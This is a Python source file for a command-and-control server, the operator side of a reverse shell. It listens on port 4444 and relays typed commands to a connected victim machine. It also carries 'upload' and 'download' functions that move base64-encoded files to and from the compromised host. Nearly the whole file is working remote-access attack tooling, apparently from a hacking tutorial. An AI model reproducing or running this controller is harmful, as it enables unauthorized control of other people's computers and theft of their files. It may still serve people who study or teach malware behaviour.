import socket
import json
import base64

class Server:
    def __init__(self, ip, port):
        self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock_obj.bind((ip,port))
    def reliable_send(self, data):
        # list elements must 'str'
        for i in range(len(data)):
            x = data[i]
            if not isinstance(x, str):
                data[i] = x.decode('utf-8')
        # convert list to JSON | encode JSON for TCP trans.
        json_data = json.dumps(data).encode('utf-8')
        self.client_obj.send(json_data)
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                # append serialized JSON data to static var
                json_data += self.client_obj.recv(1024).decode('utf-8')
                # if data is complete json.loads will execute
                return json.loads(json_data)
            except:
                continue
    def read_file(self, path):
        try:
            with open(path, 'rb') as file_obj:
                return base64.b64encode(file_obj.read())
        except:
            return "[+] ERROR - Error opening file"
    def write_file(self, name, content):
        try:
            with open(name, 'wb') as file_obj:
                file_obj.write(base64.b64decode(content))
                return "[+] File downloaded successfully"
        except:
            return "[+] ERROR - Error during creating a file"    
    def run(self):
        print("[+] Waiting for an Incoming Connection")
        self.sock_obj.listen(1)
        self.client_obj, ip_addr = self.sock_obj.accept()
        print("[+] Recieved a connection from -> "+str(ip_addr))
        while True:
            cmd = input(">> ").split()
            if len(cmd) == 0:
                continue
            if cmd[0] == "exit":
                self.reliable_send(cmd)
                self.client_obj.close()
                exit()
            if cmd[0] == "upload":
                data = self.read_file(cmd[1].split('/')[-1])
                if "ERROR" == data[4:9]:
                    print(data)
                    continue
                cmd.append(data)                
            self.reliable_send(cmd)
            response = self.reliable_receive()
            if cmd[0] == "download":
                print(self.write_file(cmd[1].split('/')[-1], response))
                continue
            print(response)

# MAIN
C2 = Server(socket.gethostname(), 4444)
C2.run()
